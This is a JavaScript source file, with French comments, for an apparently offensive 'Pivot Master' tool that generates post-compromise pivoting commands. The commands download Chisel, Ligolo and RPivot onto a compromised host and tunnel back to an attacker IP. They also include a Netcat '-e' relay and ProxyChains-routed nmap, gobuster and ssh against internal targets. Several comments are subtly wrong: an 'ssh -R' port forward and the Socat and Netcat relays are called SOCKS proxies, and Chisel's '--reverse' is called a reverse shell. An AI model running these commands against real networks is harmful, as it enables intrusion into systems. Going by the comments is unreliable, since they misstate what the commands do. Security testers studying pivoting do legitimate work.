            tab.onclick = () => this.switchTab(tool);
            tabsNav.appendChild(tab);

            // Créer le contenu
            const content = document.createElement('div');
            content.className = `tab-pane ${index === 0 ? 'active' : ''}`;
            content.id = `${tool}Content`;

            // Ajouter le titre et la description
            content.innerHTML = `
                <div class="tool-header">
                    <h4>${data.title}</h4>
                    <p>${data.description}</p>
                </div>
            `;

            // Ajouter les sections de commandes
            data.sections.forEach(section => {
                const sectionElement = document.createElement('div');
                sectionElement.className = 'command-section';
                sectionElement.innerHTML = `
                    <div class="section-header">
                        <h5>${section.title}</h5>
                        <p>${section.description}</p>
                    </div>
                    <div class="command-block">
                        <pre><code>${section.command}</code></pre>
                        <button class="copy-button" onclick="window.pivotMaster.copyToClipboard(this)">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    ${section.comment ? `<p class="command-comment">${section.comment}</p>` : ''}
                `;
                content.appendChild(sectionElement);
            });

            tabsContent.appendChild(content);
        });

        // Ajouter le bouton de copie global
        const copyAllButton = document.createElement('button');
        copyAllButton.className = 'copy-all-button';
        copyAllButton.innerHTML = '<i class="fas fa-copy"></i> Copier toutes les commandes';
        copyAllButton.onclick = () => this.copyAllCommands();
        tabsContent.appendChild(copyAllButton);
    }

    switchTab(tool) {
        try {
            // Mettre à jour les onglets
            const tabs = document.querySelectorAll('.tab-button');
            tabs.forEach(tab => tab.classList.remove('active'));

            // Mettre à jour le contenu
            const contents = document.querySelectorAll('.tab-pane');
            contents.forEach(content => content.classList.remove('active'));

            // Activer l'onglet sélectionné
            const selectedTab = Array.from(tabs).find(tab => tab.querySelector(`i.${this.getToolIcon(tool)}`));
            const selectedContent = document.getElementById(`${tool}Content`);

            if (selectedTab) selectedTab.classList.add('active');
            if (selectedContent) selectedContent.classList.add('active');
        } catch (error) {
            console.error('Erreur lors du changement d\'onglet:', error);
        }
    }

    getToolIcon(tool) {
        const icons = {
            ssh: 'fa-terminal',
            chisel: 'fa-hammer',
            ligolo: 'fa-network-wired',
            socat: 'fa-exchange-alt',
            netcat: 'fa-plug',
            proxychains: 'fa-link',
            rpivot: 'fa-project-diagram',
            plink: 'fa-windows'
        };
        return icons[tool] || 'fa-tools';
    }

    copyAllCommands() {
        if (!this.generatedCommands) return;

        let allCommands = '';
        Object.entries(this.generatedCommands).forEach(([tool, commands]) => {
            allCommands += `# ${commands.title}\n`;
            allCommands += `# ${commands.description}\n\n`;
            
            if (commands.sections && Array.isArray(commands.sections)) {
                commands.sections.forEach(section => {
                    allCommands += `# ${section.title}\n`;
                    allCommands += `# ${section.description}\n`;
                    allCommands += `${section.command}\n`;
                    if (section.comment) {
                        allCommands += `# ${section.comment}\n`;
                    }
                    allCommands += '\n';
                });
            }
            
            allCommands += '\n';
        });

        navigator.clipboard.writeText(allCommands).then(() => {
            this.showNotification('Toutes les commandes ont été copiées !', 'success');
        }).catch(err => {
            this.showNotification('Erreur lors de la copie des commandes', 'danger');
        });
    }

    /**
     * Export en script
     */
    exportScript() {
        const { attacker, target1, target2, target3, doublePivot } = this.config;
        
        let script = `#!/bin/bash\n`;
        script += `# Pivot Script - Généré par Pivot Master\n`;
        script += `# Configuration:\n`;
        script += `#   Attacker: ${attacker.ip}:${attacker.port}\n`;
        script += `#   Target1:  ${target1.ip} (${target1.user}@${target1.os})\n`;
        script += `#   Target2:  ${target2.ip}:${target2.port} (${target2.os})\n`;
        if (doublePivot) {
            script += `#   Target3:  ${target3.ip}:${target3.port}\n`;
        }
        script += `\n`;

        for (const [technique, commands] of Object.entries(this.generatedCommands)) {
            script += `\n# === ${this.getTechniqueDisplayName(technique)} ===\n`;
            
            commands.sections.forEach(section => {
                script += `\n# ${section.title}\n`;
                if (section.description) {
                    script += `# ${section.description}\n`;
                }
                if (section.command) {
                    script += `${section.command}\n`;
                    if (section.comment) {
                        script += `# ${section.comment}\n`;
                    }
                }
            });
        }

        this.downloadFile('pivot-commands.sh', script);
        this.showNotification('Script exporté !', 'success');
    }

    /**
     * Export cheatsheet
     */
    exportCheatsheet() {
        let markdown = `# Pivot Cheatsheet\n\n`;
        markdown += `**Généré par Pivot Master**\n\n`;
        markdown += `## Configuration\n\n`;
        markdown += `- **Attacker:** ${this.config.attacker.ip}:${this.config.attacker.port}\n`;
        markdown += `- **Target 1:** ${this.config.target1.ip} (${this.config.target1.user}@${this.config.target1.os})\n`;
        markdown += `- **Target 2:** ${this.config.target2.ip}:${this.config.target2.port} (${this.config.target2.os})\n`;
        if (this.config.doublePivot) {
            markdown += `- **Target 3:** ${this.config.target3.ip}:${this.config.target3.port}\n`;
        }
        markdown += `\n`;

        for (const [technique, commands] of Object.entries(this.generatedCommands)) {
            markdown += `## ${this.getTechniqueDisplayName(technique)}\n\n`;
            
            commands.sections.forEach(section => {
                markdown += `### ${section.title}\n\n`;
                markdown += '```bash\n';
                markdown += section.command;
                markdown += '\n```\n\n';
            });
        }

        this.downloadFile('pivot-cheatsheet.md', markdown);
        this.showNotification('Cheatsheet exportée !', 'success');
    }

    /**
     * Télécharger un fichier
     */
    downloadFile(filename, content) {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    /**
     * Effacer le formulaire
     */
    clearForm() {
        if (confirm('Effacer toutes les données ?')) {
            localStorage.removeItem('pivotMasterConfig');
            location.reload();
        }
    }

    /**
     * Charger un exemple
     */
    loadExample() {
        try {
            // Charger les valeurs d'exemple
            const elements = {
                attackerIp: document.getElementById('attackerIp'),
                attackerPort: document.getElementById('attackerPort'),
                target1Ip: document.getElementById('target1Ip'),
                target1Port: document.getElementById('target1Port'),
                target1User: document.getElementById('target1User'),
                target1Password: document.getElementById('target1Password'),
                target2Ip: document.getElementById('target2Ip'),
                target2Port: document.getElementById('target2Port'),
                target2User: document.getElementById('target2User'),
                target2Password: document.getElementById('target2Password'),
                doublePivot: document.getElementById('doublePivot')
            };

            // Vérifier si tous les éléments existent
            for (const [key, element] of Object.entries(elements)) {
                if (!element) {
                    console.error(`Élément manquant: ${key}`);
                    this.showNotification(`Erreur: Élément ${key} non trouvé`, 'error');
                    return;
                }
            }

            // Définir les valeurs d'exemple
            elements.attackerIp.value = '10.10.14.15';
            elements.attackerPort.value = '4444';
            elements.target1Ip.value = '192.168.1.100';
            elements.target1Port.value = '22';
            elements.target1User.value = 'user';
            elements.target1Password.value = 'password123';
            elements.target2Ip.value = '172.16.1.100';
            elements.target2Port.value = '3389';
            elements.target2User.value = 'admin';
            elements.target2Password.value = 'admin123';
            elements.doublePivot.checked = true;

            // Sélectionner quelques outils par défaut
            const toolCheckboxes = document.querySelectorAll('input[name="tools"]');
            toolCheckboxes.forEach(checkbox => {
                if (['ssh', 'chisel'].includes(checkbox.value)) {
                    checkbox.checked = true;
                } else {
                    checkbox.checked = false;
                }
            });

            // Sauvegarder la configuration
            this.saveConfig();

            // Mettre à jour l'interface
            this.toggleDoublePivot();
            this.updateNetworkVisualization();

            this.showNotification('Exemple chargé avec succès', 'success');
        } catch (error) {
            console.error('Erreur lors du chargement de l\'exemple:', error);
            this.showNotification('Erreur lors du chargement de l\'exemple', 'error');
        }
    }

    /**
     * Afficher une notification
     */
    showNotification(message, type = 'info', duration = 4000) {
        const container = document.getElementById('notificationContainer');
        if (!container) return;

        const toast = document.createElement('div');
        toast.className = `notification-toast alert-${type}`;
        toast.textContent = message;

        container.appendChild(toast);

        setTimeout(() => {
            toast.remove();
        }, duration);
    }

    /**
     * Mettre à jour la visualisation réseau
     */
    updateNetworkVisualization() {
        if (!this.networkVisualizer) {
            console.warn('NetworkVisualizer non initialisé');
            return;
        }

        // Mettre à jour la configuration depuis les champs du formulaire
        this.updateConfigFromForm();
        
        // Mettre à jour le réseau
        this.networkVisualizer.updateNetworkFromConfig();
        
        console.log('🗺️ Topologie réseau mise à jour');
    }

    /**
     * Mettre à jour la configuration depuis les champs du formulaire
     */
    updateConfigFromForm() {
        // Attaquant
        this.config.attacker.ip = document.getElementById('attackerIp')?.value || '10.10.14.15';
        this.config.attacker.port = document.getElementById('attackerPort')?.value || '4444';
        
        // Target 1
        this.config.target1.ip = document.getElementById('target1Ip')?.value || '';
        this.config.target1.port = document.getElementById('target1Port')?.value || '22';
        this.config.target1.user = document.getElementById('target1User')?.value || '';
        this.config.target1.password = document.getElementById('target1Password')?.value || '';
        this.config.target1.os = this.detectOS(document.getElementById('target1Ip')?.value || '');
        
        // Target 2
        this.config.target2.ip = document.getElementById('target2Ip')?.value || '';
        this.config.target2.port = document.getElementById('target2Port')?.value || '22';
        this.config.target2.user = document.getElementById('target2User')?.value || '';
        this.config.target2.password = document.getElementById('target2Password')?.value || '';
        this.config.target2.os = this.detectOS(document.getElementById('target2Ip')?.value || '');
        
        // Double pivot
        this.config.doublePivot = document.getElementById('doublePivot')?.checked || false;
        
        // Target 3 (si double pivot activé)
        if (this.config.doublePivot) {
            this.config.target3 = {
                ip: document.getElementById('target3Ip')?.value || '',
                port: document.getElementById('target3Port')?.value || '3389'
            };
        }
        
        console.log('📋 Configuration mise à jour:', this.config);
    }

    /**
     * Générer les commandes SSH
     */
    generateSSHCommands() {
        const config = this.config;
        
        return {
            title: 'SSH Tunneling',
            description: config.doublePivot ? 
                'Établissement d\'un tunnel SSH pour accéder au réseau cible via un double pivot' :
                'Établissement d\'un tunnel SSH pour accéder au réseau cible',
            sections: [
                {
                    title: '1. Configuration du Tunnel SSH',
                    description: config.doublePivot ?
                        'Sur la machine pivot (Target 1), exécutez la commande suivante pour créer un tunnel vers la machine cible (Target 2)' :
                        'Sur la machine pivot (Target 1), exécutez la commande suivante pour créer un tunnel vers la machine cible',
                    command: `# Sur Target 1 (Machine Pivot)
# Cette commande crée un tunnel SOCKS sur le port 1080 de la machine attaquante
# -R : Crée un tunnel distant (remote)
# 1080 : Port sur la machine attaquante
# ${config.target1.ip}:${config.target1.port} : Machine et port cible
# -N : Ne pas exécuter de commande distante (tunnel uniquement)
ssh -R 1080:${config.target1.ip}:${config.target1.port} ${config.attacker.ip} -N`,
                    comment: 'Le tunnel SSH crée un proxy SOCKS sur le port 1080 de votre machine attaquante'
                }
            ]
        };
    }

    /**
     * Générer les commandes Chisel
     */
    generateChiselCommands() {
        const config = this.config;
        
        return {
            title: 'Chisel Tunneling',
            description: config.doublePivot ?
                'Établissement d\'un tunnel avec Chisel pour un accès fiable au réseau cible via un double pivot' :
                'Établissement d\'un tunnel avec Chisel pour un accès fiable au réseau cible',
            sections: [
                {
                    title: '1. Démarrage du Serveur Chisel',
                    description: 'Sur votre machine attaquante, démarrez le serveur Chisel',
                    command: `# Sur la machine attaquante
# Télécharger Chisel si ce n'est pas déjà fait
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
chmod +x chisel_1.7.7_linux_amd64

# Démarrer le serveur Chisel
# -p : Port d'écoute
# --reverse : Mode reverse shell
./chisel_1.7.7_linux_amd64 server -p ${config.attacker.port} --reverse`,
                    comment: 'Le serveur Chisel écoute sur le port spécifié et attend les connexions des clients'
                },
                {
                    title: '2. Configuration du Client Chisel',
                    description: 'Sur la machine pivot, configurez et démarrez le client Chisel',
                    command: `# Sur Target 1 (Machine Pivot)
# Télécharger Chisel
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
chmod +x chisel_1.7.7_linux_amd64

# Démarrer le client Chisel
# R:1080 : Crée un tunnel SOCKS sur le port 1080
# ${config.target1.ip}:${config.target1.port} : Machine et port cible
./chisel_1.7.7_linux_amd64 client ${config.attacker.ip}:${config.attacker.port} R:1080:${config.target1.ip}:${config.target1.port}`,
                    comment: 'Le client Chisel crée un tunnel SOCKS sur le port 1080 de la machine attaquante'
                }
            ]
        };
    }

    /**
     * Générer les commandes Ligolo
     */
    generateLigoloCommands() {
        const config = this.config;
        
        return {
            title: 'Ligolo Tunneling',
            description: config.doublePivot ?
                'Établissement d\'un tunnel avec Ligolo pour un accès fiable au réseau cible via un double pivot' :
                'Établissement d\'un tunnel avec Ligolo pour un accès fiable au réseau cible',
            sections: [
                {
                    title: '1. Configuration du Serveur Ligolo',
                    description: 'Sur votre machine attaquante, configurez et démarrez le serveur Ligolo',
                    command: `# Sur la machine attaquante
# Télécharger Ligolo si ce n'est pas déjà fait
wget https://github.com/sysdream/ligolo/releases/download/v0.4.4/ligolo-v0.4.4-linux-amd64
chmod +x ligolo-v0.4.4-linux-amd64

# Démarrer le serveur Ligolo
# -selfcert : Génère un certificat auto-signé
# -laddr : Adresse et port d'écoute
./ligolo-v0.4.4-linux-amd64 -selfcert -laddr 0.0.0.0:${config.attacker.port}`,
                    comment: 'Le serveur Ligolo écoute sur le port spécifié et attend les connexions des clients'
                },
                {
                    title: '2. Configuration du Client Ligolo',
                    description: 'Sur la machine pivot, configurez et démarrez le client Ligolo',
                    command: `# Sur Target 1 (Machine Pivot)
# Télécharger Ligolo
wget https://github.com/sysdream/ligolo/releases/download/v0.4.4/ligolo-v0.4.4-linux-amd64
chmod +x ligolo-v0.4.4-linux-amd64

# Démarrer le client Ligolo
# -connect : Se connecte au serveur
# -socks : Crée un tunnel SOCKS sur le port spécifié
./ligolo-v0.4.4-linux-amd64 -connect ${config.attacker.ip}:${config.attacker.port} -socks 1080`,
                    comment: 'Le client Ligolo crée un tunnel SOCKS sur le port 1080 de la machine attaquante'
                }
            ]
        };
    }

    /**
     * Générer les commandes Socat
     */
    generateSocatCommands() {
        const config = this.config;
        
        return {
            title: 'Socat Tunneling',
            description: config.doublePivot ?
                'Établissement d\'un tunnel avec Socat pour un accès direct au réseau cible via un double pivot' :
                'Établissement d\'un tunnel avec Socat pour un accès direct au réseau cible',
            sections: [
                {
                    title: '1. Installation de Socat',
                    description: 'Sur la machine pivot, installez Socat si ce n\'est pas déjà fait',
                    command: `# Sur Target 1 (Machine Pivot)
# Installation de Socat
apt-get update && apt-get install -y socat  # Pour Debian/Ubuntu
# ou
yum install -y socat  # Pour RHEL/CentOS`,
                    comment: 'Socat doit être installé sur la machine pivot'
                },
                {
                    title: '2. Création du Tunnel',
                    description: 'Sur la machine pivot, créez un tunnel vers la machine cible',
                    command: `# Sur Target 1 (Machine Pivot)
# Création du tunnel
# TCP-LISTEN:1080 : Écoute sur le port 1080
# fork : Permet plusieurs connexions simultanées
# TCP:${config.target1.ip}:${config.target1.port} : Machine et port cible
socat TCP-LISTEN:1080,fork TCP:${config.target1.ip}:${config.target1.port}`,
                    comment: 'Le tunnel Socat est maintenant actif sur le port 1080'
                }
            ]
        };
    }

    /**
     * Générer les commandes Netcat
     */
    generateNetcatCommands() {
        const config = this.config;
        
        return {
            title: 'Netcat Tunneling',
            description: config.doublePivot ?
                'Établissement d\'un tunnel avec Netcat pour un accès basique au réseau cible via un double pivot' :
                'Établissement d\'un tunnel avec Netcat pour un accès basique au réseau cible',
            sections: [
                {
                    title: '1. Vérification de Netcat',
                    description: 'Sur la machine pivot, vérifiez que Netcat est installé',
                    command: `# Sur Target 1 (Machine Pivot)
# Vérifier la version de Netcat
nc -h`,
                    comment: 'Netcat doit être installé sur la machine pivot'
                },
                {
                    title: '2. Création du Tunnel',
                    description: 'Sur la machine pivot, créez un tunnel vers la machine cible',
                    command: `# Sur Target 1 (Machine Pivot)
# Création du tunnel
# -l : Mode écoute
# -p : Port d'écoute
# -k : Garde la connexion ouverte
nc -l -p 1080 -k -e nc ${config.target1.ip} ${config.target1.port}`,
                    comment: 'Le tunnel Netcat est maintenant actif sur le port 1080'
                }
            ]
        };
    }

    /**
     * Générer les commandes ProxyChains
     */
    generateProxyChainsCommands() {
        const config = this.config;
        
        return {
            title: 'ProxyChains Configuration',
            description: 'Configuration de ProxyChains pour utiliser le tunnel établi',
            sections: [
                {
                    title: '1. Configuration de ProxyChains',
                    description: 'Sur votre machine attaquante, configurez ProxyChains',
                    command: `# Sur la machine attaquante
# Éditer le fichier de configuration de ProxyChains
sudo nano /etc/proxychains.conf

# Ajouter la ligne suivante à la fin du fichier :
socks5 127.0.0.1 1080`,
                    comment: 'ProxyChains utilisera le tunnel SOCKS sur le port 1080'
                },
                {
                    title: '2. Utilisation de ProxyChains',
                    description: 'Utilisez ProxyChains pour vos outils de reconnaissance',
                    command: `# Exemples d'utilisation
# Scan de ports via le tunnel
proxychains nmap -sT -p 80,443,22 ${config.target1.ip}

# Reconnaissance web via le tunnel
proxychains gobuster dir -u http://${config.target1.ip} -w /usr/share/wordlists/dirb/common.txt

# Connexion SSH via le tunnel
proxychains ssh ${config.target1.user}@${config.target1.ip}`,
                    comment: 'Tous les outils utilisés avec proxychains passeront par le tunnel'
                }
            ]
        };
    }

    /**
     * Générer les commandes RPivot
     */
    generateRPivotCommands() {
        const config = this.config;
        
        return {
            title: 'RPivot Tunneling',
            description: 'Établissement d\'un tunnel avec RPivot pour Windows',
            sections: [
                {
                    title: '1. Démarrage du Serveur RPivot',
                    description: 'Sur votre machine attaquante, démarrez le serveur RPivot',
                    command: `# Sur la machine attaquante
# Télécharger RPivot
git clone https://github.com/klsecservices/rpivot.git
cd rpivot

# Démarrer le serveur RPivot
python server.py --server-port ${config.attacker.port} --server-ip 0.0.0.0`,
                    comment: 'Le serveur RPivot écoute sur le port spécifié'
                },
                {
                    title: '2. Configuration du Client RPivot',
                    description: 'Sur la machine pivot Windows, configurez le client RPivot',
                    command: `# Sur Target 1 (Machine Pivot Windows)
# Télécharger le client RPivot
# Exécuter le client
python client.py --server-ip ${config.attacker.ip} --server-port ${config.attacker.port}`,
                    comment: 'Le client RPivot crée un tunnel SOCKS sur le port 1080'
                }
            ]
        };
    }

    /**
     * Générer les commandes Plink
     */
    generatePlinkCommands() {
        const config = this.config;
        
        return {
            title: 'Plink SSH Tunneling',
            description: 'Établissement d\'un tunnel SSH avec Plink pour Windows',
            sections: [
                {
                    title: '1. Installation de Plink',
                    description: 'Sur la machine pivot Windows, installez Plink',
                    command: `# Sur Target 1 (Machine Pivot Windows)
# Télécharger Plink depuis PuTTY
# https://www.putty.org/
# Ou utiliser winget
winget install PuTTY.PuTTY`,
                    comment: 'Plink est inclus avec PuTTY'
                },
                {
                    title: '2. Création du Tunnel',
                    description: 'Sur la machine pivot Windows, créez le tunnel SSH',
                    command: `# Sur Target 1 (Machine Pivot Windows)
# Création du tunnel SSH
# -R : Crée un tunnel distant
# 1080 : Port sur la machine attaquante
# ${config.target1.ip}:${config.target1.port} : Machine et port cible
# -N : Ne pas exécuter de commande distante
plink -R 1080:${config.target1.ip}:${config.target1.port} ${config.attacker.ip} -N`,
                    comment: 'Le tunnel SSH est maintenant actif sur le port 1080'
                }
            ]
        };
    }

    /**
     * Copier le texte dans le presse-papiers
     */
    copyToClipboard(button) {
        try {
            const commandBlock = button.closest('.command-block');
            const codeElement = commandBlock.querySelector('code');
            const textToCopy = codeElement.textContent;

            navigator.clipboard.writeText(textToCopy).then(() => {
                // Changer temporairement l'icône pour indiquer le succès
                const icon = button.querySelector('i');
                const originalClass = icon.className;
                icon.className = 'fas fa-check';
                
                // Restaurer l'icône originale après 2 secondes
                setTimeout(() => {
                    icon.className = originalClass;
                }, 2000);

                this.showNotification('Commande copiée dans le presse-papiers', 'success');
            }).catch(err => {
                console.error('Erreur lors de la copie:', err);
                this.showNotification('Erreur lors de la copie de la commande', 'error');
            });
        } catch (error) {
            console.error('Erreur lors de la copie:', error);
            this.showNotification('Erreur lors de la copie de la commande', 'error');
        }
    }
}

// Fonctions globales pour les événements HTML
function generateCommands() { 
    if (window.pivotMaster) {
        window.pivotMaster.generateCommands();
    } else {
        console.error('PivotMaster n\'est pas initialisé');
    }
}

function clearForm() { 
    if (window.pivotMaster) {
        window.pivotMaster.clearForm();
    }
}

function loadExample() { 
    if (window.pivotMaster) {
        window.pivotMaster.loadExample();
    }
}

function copyAllCommands() { 
    if (window.pivotMaster) {
        window.pivotMaster.copyAllCommands();
    }
}

function exportScript() { 
    if (window.pivotMaster) {
        window.pivotMaster.exportScript();
    }
}

function exportCheatsheet() { 
    if (window.pivotMaster) {
        window.pivotMaster.exportCheatsheet();
    }
}

// Fonctions globales pour la visualisation réseau
function resetNetworkView() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.resetNetwork();
    }
}

function fitNetworkView() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.fitNetwork();
    }
}

function exportNetworkImage() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.exportImage();
    }
}

function toggleNetworkPhysics() {
    if (window.pivotMaster && window.pivotMaster.networkVisualizer) {
        window.pivotMaster.networkVisualizer.togglePhysics();
    }
}

// Fonction globale pour charger les hosts depuis le Host Manager
function loadHostsFromManager() {
    if (window.pivotMaster) {
        window.pivotMaster.loadHostsFromManager();
        window.pivotMaster.showNotification('Hosts chargés depuis le Host Manager', 'success');
    }
}

// Initialisation au chargement de la page
document.addEventListener('DOMContentLoaded', async function() {
    try {
        window.pivotMaster = new PivotMaster();
        await window.pivotMaster.init();
        console.log('🚀 Pivot Master prêt !');
    } catch (error) {
        console.error('❌ Erreur lors de l\'initialisation de Pivot Master:', error);
    }
}); 